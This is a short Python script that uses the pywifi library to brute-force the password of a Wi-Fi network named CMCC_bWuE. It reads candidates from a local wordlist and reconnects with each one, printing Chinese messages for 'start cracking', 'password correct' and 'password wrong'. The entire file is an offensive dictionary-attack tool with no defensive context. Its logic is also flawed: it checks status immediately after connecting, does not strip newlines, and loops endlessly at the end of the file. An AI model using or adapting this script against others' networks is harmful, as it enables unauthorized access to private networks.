import pywifi
from pywifi import const
import time
def fun(wifissid,wifipwd):
    wifi=pywifi.PyWiFi()
    internt=wifi.interfaces()[0]
    internt.disconnect()
    if internt.status()==const.IFACE_DISCONNECTED:
        protion=pywifi.Profile()
        protion.ssid=wifissid
        protion.key=wifipwd
        internt.remove_all_network_profiles()
        newporfile=internt.add_network_profile(protion)
        internt.connect(newporfile)
        if internt.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False
def red():
    print('开始破解：')
    path='E:\pycharm_pro\exercise\lence\passwordbook.txt'
    file=open(path,'r')
    while True:
        try:
            filepwd=file.readline()
            bools=fun('CMCC_bWuE',filepwd)
            if bools:
                print('密码正确',filepwd)
                break
            else:
                print('密码错误')
        except:
            continue
    file.close()
red()